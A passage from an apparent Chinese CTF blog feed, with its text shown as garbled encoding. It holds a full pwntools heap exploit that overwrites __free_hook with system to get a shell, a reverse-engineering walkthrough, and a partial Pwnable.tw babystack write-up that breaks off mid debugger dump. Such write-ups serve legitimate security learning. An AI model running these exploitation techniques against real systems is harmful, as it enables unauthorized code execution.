class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_</span>(<span class="params">sz,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host, port = <span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p = remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        dele(i)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10000</span>-<span class="number">0xf0</span>+<span class="number">1</span>))</span><br><span class="line">    add_(<span class="number">0x40</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,p64(<span class="number">0</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    offset=<span class="number">0x1ebc20</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-offset</span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10000</span>-<span class="number">0xa0</span>+<span class="number">1</span>))</span><br><span class="line">    add_(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">    add(<span class="number">0x40</span>,payload)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="QIAO"><a href="#QIAO" class="headerlink" title="QIAO"></a>QIAO</h4><p>è¿™é¢˜è‚äº†å¥½ä¹…ï¼Œå¹¶ä¸æ˜¯å®ƒéš¾ï¼Œè€Œæ˜¯åƒäº†é€†å‘ç»éªŒåŒ®ä¹çš„äºã€‚<br>é¦–å…ˆè¿™é¢˜èŠ±æŒ‡ä»¤å¾ˆå¤šâ€jmp $+5â€å¯¼è‡´idaæ— æ³•åç¼–è¯‘ï¼Œé‚£å°±ç›´æ¥ä¸Šæ‰‹è°ƒäº†ã€‚<br>mainå‡½æ•°å¼€å§‹å…ˆæŠŠä¸€ä¸ªå¤§æ•°æ”¾å…¥stacké‡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [rbp-34h], 0B63C9FE1h</span><br></pre></td></tr></table></figure><p>ä¹‹åé€šè¿‡è°ƒè¯•ä¼šä¸æ–­çš„å°†è¿™ä¸ªæ•°å’Œå…¶ä»–çš„æ•°è¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰çš„è¯å°±è·³è½¬ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                                      mov     eax, [rbp-38h]</span><br><span class="line">.text:00000000004019FD                 sub     eax, 0B63C9FE1h</span><br><span class="line">.text:0000000000401A02                 mov     [rbp-50h], eax</span><br><span class="line">.text:0000000000401A05                 jz      loc_401ADB</span><br><span class="line">.text:0000000000401A0B                 jmp     $+5</span><br><span class="line"></span><br><span class="line">  loc_401ADB:                             ; CODE XREF: .text:0000000000401A05â†‘j</span><br><span class="line">.text:0000000000401ADB                 mov     eax, 501DC785h</span><br><span class="line">.text:0000000000401AE0                 mov     ecx, 44AF965Fh</span><br><span class="line">.text:0000000000401AE5                 mov     edx, [rbp-4]</span><br><span class="line">.text:0000000000401AE8                 cmp     edx, 2</span><br><span class="line">.text:0000000000401AEB                 cmovnz  eax, ecx</span><br><span class="line">.text:0000000000401AEE                 mov     [rbp-34h], eax</span><br><span class="line">.text:0000000000401AF1                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè·³è½¬åˆ°loc_401ADBè¿›è¡Œçš„æ˜¯æ¯”è¾ƒçš„æ“ä½œï¼Œåˆ†æå¾—æ˜¯å¯¹argcçš„æ£€æŸ¥ï¼Œå¦‚æœä¸º2å°±é€šè¿‡ã€‚</p><p>ä¹‹åæ›´æ–°è¿™ä¸ªå¤§æ•°ä¸º501DC785hï¼Œå¹¶ç»§ç»­å’Œå…¶ä»–æ•°æ¯”è¾ƒï¼Œç›¸ç­‰çš„è¯å°±è·³è½¬ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A94                 mov     eax, [rbp-38h]</span><br><span class="line">.text:0000000000401A97                 sub     eax, 501DC785h</span><br><span class="line">.text:0000000000401A9C                 mov     [rbp-6Ch], eax</span><br><span class="line">.text:0000000000401A9F                 jz      loc_401B1D</span><br><span class="line">.text:0000000000401AA5                 jmp     $+5</span><br><span class="line"></span><br><span class="line">.text:0000000000401B1D loc_401B1D:                             ; CODE XREF: .text:0000000000401A9Fâ†‘j</span><br><span class="line">.text:0000000000401B1D                 mov     eax, 874FBE3Fh</span><br><span class="line">.text:0000000000401B22                 mov     ecx, 0B6DAB60Eh</span><br><span class="line">.text:0000000000401B27                 mov     rdx, [rbp-28h]</span><br><span class="line">.text:0000000000401B2B                 mov     rdi, [rdx+8]</span><br><span class="line">.text:0000000000401B2F                 mov     [rbp-7Ch], eax</span><br><span class="line">.text:0000000000401B32                 mov     [rbp-80h], ecx</span><br><span class="line">.text:0000000000401B35                 call    _strlen</span><br><span class="line">.text:0000000000401B3A                 cmp     rax, 20h ; &#x27; &#x27;</span><br><span class="line">.text:0000000000401B3E                 mov     ecx, [rbp-7Ch]</span><br><span class="line">.text:0000000000401B41                 mov     esi, [rbp-80h]</span><br><span class="line">.text:0000000000401B44                 cmovnz  ecx, esi</span><br><span class="line">.text:0000000000401B47                 mov     [rbp-34h], ecx</span><br><span class="line">.text:0000000000401B4A                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>è·³åˆ°loc_401B1Dï¼Œcalläº†strlenï¼Œå®Œæˆçš„æ˜¯å¯¹argsçš„é•¿åº¦è¿›è¡Œæ¯”è¾ƒï¼Œä¸º0x20å³é€šè¿‡ã€‚</p><p>å¤§æ•°æ›´æ–°ä¸º874FBE3Fhï¼Œä¹‹åå†æ¯”è¾ƒè·³åˆ°äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401B79 loc_401B79:                             ; CODE XREF: .text:0000000000401997â†‘j</span><br><span class="line">.text:0000000000401B79                 mov     eax, 8F7A1A66h</span><br><span class="line">.text:0000000000401B7E                 mov     ecx, 2D33904h</span><br><span class="line">.text:0000000000401B83                 mov     dword ptr [rbp-10h], 1BDh</span><br><span class="line">.text:0000000000401B8A                 mov     dword ptr [rbp-14h], 63h ; &#x27;c&#x27;</span><br><span class="line">.text:0000000000401B91                 mov     edx, [rbp-10h]</span><br><span class="line">.text:0000000000401B94                 mov     esi, [rbp-14h]</span><br><span class="line">.text:0000000000401B97                 imul    edx, edx</span><br><span class="line">.text:0000000000401B9A                 add     edx, 1</span><br><span class="line">.text:0000000000401B9D                 imul    esi, esi</span><br><span class="line">.text:0000000000401BA0                 imul    esi, 7</span><br><span class="line">.text:0000000000401BA3                 cmp     edx, esi</span><br><span class="line">.text:0000000000401BA5                 cmovz   eax, ecx</span><br><span class="line">.text:0000000000401BA8                 mov     [rbp-34h], eax</span><br><span class="line">.text:0000000000401BAB                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰å•¥ä¹Ÿæ²¡å¹²ï¼Œå°±æ›´æ–°äº†å¤§æ•°ä¸º8F7A1A66hï¼Œå†è·³ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401C0C loc_401C0C:                             ; CODE XREF: .text:00000000004019C3â†‘j</span><br><span class="line">.text:0000000000401C0C                 mov     rax, [rbp-28h]</span><br><span class="line">.text:0000000000401C10                 mov     rdi, [rax+8]</span><br><span class="line">.text:0000000000401C14                 call    sub_401180</span><br><span class="line">.text:0000000000401C19                 mov     [rbp-30h], rax</span><br><span class="line">.text:0000000000401C1D                 mov     rdi, [rbp-30h]</span><br><span class="line">.text:0000000000401C21                 call    sub_4018C0</span><br><span class="line">.text:0000000000401C26                 mov     ecx, 0BC6F950Fh</span><br><span class="line">.text:0000000000401C2B                 mov     edx, 3B7E9E40h</span><br><span class="line">.text:0000000000401C30                 cmp     eax, 0</span><br><span class="line">.text:0000000000401C33                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401C36                 mov     [rbp-34h], ecx</span><br><span class="line">.text:0000000000401C39                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹æ˜¯å…³é”®éƒ¨åˆ†ã€‚</p><p>ä¸€èˆ¬è¿™ç§è¦æˆ‘ä»¬è¾“å…¥çš„é€†å‘é¢˜ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå˜å½¢ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒï¼Œç»åˆ†æå‘ç°sub_401180å®Œæˆçš„å°±æ˜¯å¯¹è¾“å…¥è¿›è¡Œå˜å½¢ã€‚</p><p>å¦‚æˆ‘ä»¬è¾“å…¥â€™aâ€™*0x20,å†…å­˜ä¸­â€™aâ€™å 1ä¸ªå­—èŠ‚ï¼Œè€Œå˜å½¢åâ€™aâ€™è¡¨æ˜¯16è¿›åˆ¶çš„0xaï¼Œåªå 4bitï¼Œä»è€Œå˜å½¢ä¸ºé•¿åº¦ä¸º0x10çš„â€™aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaâ€™(å†…å­˜ä¸­)ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x424290</span><br><span class="line">0x424290:0x00000000000000000x0000000000000021</span><br><span class="line">0x4242a0:0xaaaaaaaaaaaaaaaa0xaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>è€Œsub_4018C0ç†è®ºä¸Šåº”è¯¥æ˜¯æ¯”è¾ƒå‡½æ•°ï¼Œè€Œä¸”åˆ†æå‘ç°å‡½æ•°çš„è¿”å›åeaxä¼šå’Œ1æ¯”è¾ƒï¼Œä¸º1å°±è¡¨ç¤ºé€šè¿‡ã€‚ä½†è¿™ä¸ªå‡½æ•°åç¼–è¯‘åååˆ†å¤æ‚ï¼Œæ„Ÿè§‰ä¸åƒäººå†™çš„ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æ”¾æ”¾å¼ƒé™æ€åˆ†æï¼ˆå®é™…ä¸Šé™æ€åˆ†æäº†å¥½ä¹…åˆ†æäº†ä¸ªå¯‚å¯ï¼‰ã€‚</p><p>é€šè¿‡è°ƒè¯•å‘ç°sub_4018C0æ‰§è¡Œå®Œåä¼šé‡Šæ”¾ä¸€ä¸ªå †å—ï¼Œè€Œä¸”å †ä¸­å¤šäº†å¥½å¤šå¥‡æ€ªçš„å†…å®¹ï¼Œå¹¶ä¸”å’Œæˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å…³ç³»ã€‚<br>äºæ˜¯æˆ‘çŒœæµ‹å°±æ˜¯å’Œå †é‡Œçš„å†…å®¹æ¯”è¾ƒï¼Œäºæ˜¯åœ¨freeä¸‹æ–­å¾—åˆ°å †é‡Œçš„æ•°æ®ä¸º<code>7fa392e666d78abbb655165528fff33f</code>ï¼ˆç»è¿‡å¤§å°ç«¯å˜æ¢åçš„ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x4242b0      //å°†è¦freeçš„å †</span><br><span class="line">0x4242b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x4242c0:0xbb8ad766e692a37f0x3ff3ff28551655b6</span><br></pre></td></tr></table></figure><p>å°†å…¶ä½œä¸ºè¾“å…¥æœç„¶è¿”å›ä¸º1ï¼Œä¹‹åå°±é¡ºåˆ©æ‹¿åˆ°flagäº†ã€‚ğŸš©</p><p>è¿˜æœ‰ä¸€é“goçš„pwné¢˜è¿˜æ²¡å¤ç°å¥½ï¼Œä¹‹åä¼šå•ç‹¬å†™ä¸€ç¯‡ï¼Œruanå¸ˆå‚…tqlâœ¨</p><p>è¿™åœºæ¯”èµ›æ‰“ä¸‹æ¥æ”¶è·é¢‡å¤šï¼Œä½†çœ‹ç€å¤§æŠŠçš„å®‰å“é€†å‘å®å±éš¾å—ï¼Œå…¶å®æˆ‘ä»¬å †çš„pwnå’Œwebè§£å‡ºçš„é¢˜ç›®æ•°é‡å’Œå‰é¢çš„é˜Ÿä¼å·®ä¸å¤šçš„ï¼Œä¸»è¦åƒäºåœ¨re,cryptoå’Œmiscï¼Œè¯´åˆ°åº•è¿˜æ˜¯è‡ªå·±ä¸å¤Ÿå¼ºã€‚keep it upğŸ±â€ğŸ‘¤</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw babystack</title>
      <link href="/2020/10/20/Pwnable_babystack/"/>
      <url>/2020/10/20/Pwnable_babystack/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-babystack"><a href="#Pwnable-tw-babystack" class="headerlink" title="Pwnable.tw babystack"></a>Pwnable.tw babystack</h3><blockquote><p>è¿œç¨‹ææˆ‘å¿ƒæ€ğŸ¤¬ï¼Œæ”¶å‘æ”¹äº†åŠå¤©ï¼Œä½†æ¼æ´ç‚¹è¿˜æ˜¯æŒºç»†èŠ‚çš„ã€‚</p></blockquote><span id="more"></span><p>ç¨‹å¼ä¸€å¼€å§‹å…ˆç”Ÿæˆé•¿åº¦0x10çš„éšæœºæ•°å¹¶æ”¾åœ¨rbp-0x20çš„ä½ç½®ï¼Œå¹¶åœ¨bssä¸Šå¤‡ä»½ã€‚<br>ä¹‹åæ˜¯èœå•é€‰é¡¹ï¼š</p><p>1æ˜¯loginè¦æ±‚æˆ‘ä»¬è¾“å…¥passwordå¹¶æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„passwordçš„é•¿åº¦æ¥å’Œæ ˆä¸­ç›¸åº”ä½ç½®è¿›è¡Œæ¯”è¾ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall login(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Your passowrd :&quot;);</span><br><span class="line">  read_n((unsigned __int8 *)&amp;s, 0x7Fu);</span><br><span class="line">  v1 = strlen(&amp;s);</span><br><span class="line">  if ( strncmp(&amp;s, a1, v1) )</span><br><span class="line">    return puts(&quot;Failed !&quot;);</span><br><span class="line">  flag = 1;</span><br><span class="line">  return puts(&quot;Login Success !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰2ä¸ªæƒ³æ³•ï¼š<br>1.å¯ä»¥é€šè¿‡strncmpä¾æ¬¡æ¯”è¾ƒæ¥çˆ†ç ´å‡ºpasswordã€‚2.strncmp(&amp;s, a1, v1)ï¼Œ&amp;sæ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œåœ¨ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¯é€šè¿‡è¾“å…¥â€™\x00â€™ç›´æ¥ä½¿å…¶è¿”å›ä¸º0ï¼ŒloginæˆåŠŸã€‚</p><p>loginä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œ2çš„copyæ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_E76(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char src; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Copy :&quot;);</span><br><span class="line">  read_n((unsigned __int8 *)&amp;src, 0x3Fu);</span><br><span class="line">  strcpy(a1, &amp;src);</span><br><span class="line">  return puts(&quot;It is magic copy !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºå•¥æ˜¯magic copy?é™¤äº†strcpyæœ‰ç‚¹å¯ç–‘ï¼Œä½†ä¹Ÿæ²¡æ˜æ˜¾çš„æ¼æ´ã€‚</p><p>çœ‹äº†ä¸€éä¸‹æ¥é™¤äº†çˆ†ç ´å‡ºpasswordå¤–æ²¡å•¥æƒ³æ³•äº†ğŸ¤¦</p><p>ä¹‹åä¸€æ¬¡å¶ç„¶çš„å°è¯•åœ¨å¾—åˆ°passwordåç”±äºæˆ‘åˆå¤šè¾“å…¥â€™aâ€™*0x50ï¼Œåœ¨copyæ‰§è¡Œstrcpyä¹‹åè¿”å›ä¸»å‡½æ•°å‘ç°passwordè¢«æ”¹ä¸ºâ€™aâ€™äº†ï¼ï¼ï¼</p><p>ä»”ç»†è°ƒè¯•åœ¨æ±‡ç¼–é‡Œå‘ç°é—®é¢˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">loginå‡½æ•°çš„æ ˆå¸§ï¼š</span><br><span class="line"></span><br><span class="line">.text:0000000000000DEF                 push    rbp</span><br><span class="line">.text:0000000000000DF0                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000DF3                 sub     rsp, 90h</span><br><span class="line"></span><br><span class="line">copyå‡½æ•°çš„æ ˆå¸§ï¼š</span><br><span class="line">.text:0000000000000E76                 push    rbp</span><br><span class="line">.text:0000000000000E77                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000E7A                 sub     rsp, 90h</span><br></pre></td></tr></table></figure><p>ä¸»è°ƒç”¨å‡½æ•°éƒ½æ˜¯mainå‡½æ•°ï¼Œè¿™æ„å‘³ç€login()å’Œcopy()å‡½æ•°æ˜¯å…¬ç”¨ä¸€ä¸ªæ ˆçš„ï¼ï¼ï¼ï¼</p><p>è¿™æ ·å°±èƒ½è§£é‡Šé€šäº†ï¼Œåœ¨login()é‡Œè¾“å…¥çš„â€™aâ€™ä¼šæ®‹å­˜åœ¨æ ˆé‡Œï¼Œå½“copy()å†æ¬¡ç”¨åˆ°è¿™éƒ¨åˆ†æ ˆæ˜¯ï¼Œæœ¬æ˜¯æƒ³åˆ©ç”¨read_n((unsigned __int8 *)&amp;src, 0x3Fu);æœ€å¤šè¾“å…¥0x3fé‚£æœ€åä¸€ä¸ªå°±æ˜¯â€™\x00â€™æ¥æˆªæ–­ï¼Œä½†å®é™…ä¸Šæ ˆé‡Œè¯¥å¤„çš„ä½ç½®å·²ç»è¢«å†™å…¥äº†â€™aâ€™ï¼Œå¯å¯¼è‡´åœ¨strcpyæ—¶mainå‡½æ•°çš„æ ˆæº¢å‡ºã€‚</p><p>æ€è·¯æœ‰äº†ï¼Œä½†æ²¡åœ°å€ï¼Œè‚¯å®šæœ‰åŠæ³•æ³„éœ²çš„ã€‚</p><p>æƒ³åˆ°passwordæ˜¯é€šè¿‡strncmpçš„æ¯”è¾ƒæ¥è·å¾—çš„ï¼Œä¸”æ¯”è¾ƒçš„é•¿åº¦å¯æ§ï¼Œé‚£æˆ‘ä»¬ä¹Ÿèƒ½ç”¨ç›¸åŒçš„åŠæ³•æ³„éœ²å‡ºstacké‡Œçš„åœ°å€ã€‚</p><p>è¿™é‡Œæˆ‘çš„æ€è·¯çš„loginæ—¶è¾“å…¥â€™\x00â€™+â€™1â€™*87ï¼Œè¿™æ ·æ—¢èƒ½loginæˆåŠŸåˆèƒ½æ”¹passwordä¸ºâ€™1â€™*0x10ï¼Œä½†ä¸ºä»€ä¹ˆæ˜¯87ä¸ªå‘¢ï¼Œä¸€æ–¹é¢æ˜¯ä¸ºäº†strcpyæ”¹passwordï¼Œå¦ä¸€ä¸ªæ˜¯ç”±äºåœ¨è¾“å…¥è¿™ä¹ˆå¤šçš„é•¿åº¦æ—¶ï¼Œmainå‡½æ•°stacké‡Œçš„passwoed(è¢«æ”¹äº†çš„)åé¢ä¼šå†™å…¥stdvbufçš„åœ°å€ï¼ï¼ˆè‡³äºä¸ºä»€ä¹ˆä¼šå†™å…¥è¿™ä¸ªåœ°å€ï¼Œä¸ªäººæƒ³æ³•å¯èƒ½æ—¶æ‰§è¡Œäº†å¯¹è¾“å…¥æµåˆå§‹ç›¸å…³çš„æ“ä½œï¼Œè¿˜æœ‰å¾…ç ”ç©¶ï¼‰ï¼Œé‚£è¿™æ ·çš„è¯å°±èƒ½é€šè¿‡å†æ¬¡loginæ¥leakå‡ºLibcåœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000â”‚ rsp  0x7ffd0e102f00 â—‚â€” 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">07:0038â”‚      0x7ffd0e102f38 â—‚â€” 0x3161616161616161 (&#x27;aaaaaaa1&#x27;)</span><br><span class="line">08:0040â”‚      0x7ffd0e102f40 â—‚â€” 0x3131313131313131 (&#x27;11111111&#x27;)  //password</span><br><span class="line">... â†“</span><br><span class="line">0a:0050â”‚ rsi  0x7ffd0e102f50 â—‚â€” 0x3131313131310a31 (&#x27;1\n111111&#x27;)</span><br><span class="line">0b:0058â”‚      0x7ffd0e102f58 â€”â–¸ 0x7fdc09940fb4 (setvbuf+324) â—‚â€” 0xfc085480b8bd231</span><br><span class="line">0c:0060â”‚ rbp  0x7ffd0e102f60 â€”â–¸ 0x5555a2d50060 â—‚â€” 0x41ff894156415741</span><br><span class="line">0d:0068â”‚      0x7ffd0e102f68 â€”â–¸ 0x7fdc098f1830 (__libc_start_main+240) â—‚</span><br></pre></td></tr></table></figure><p>å¦‚æœåªæ˜¯æ”¹passwordï¼Œè€Œæ²¡å‘ä¸‹ç»§ç»­è¦†ç›–çš„è¯æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 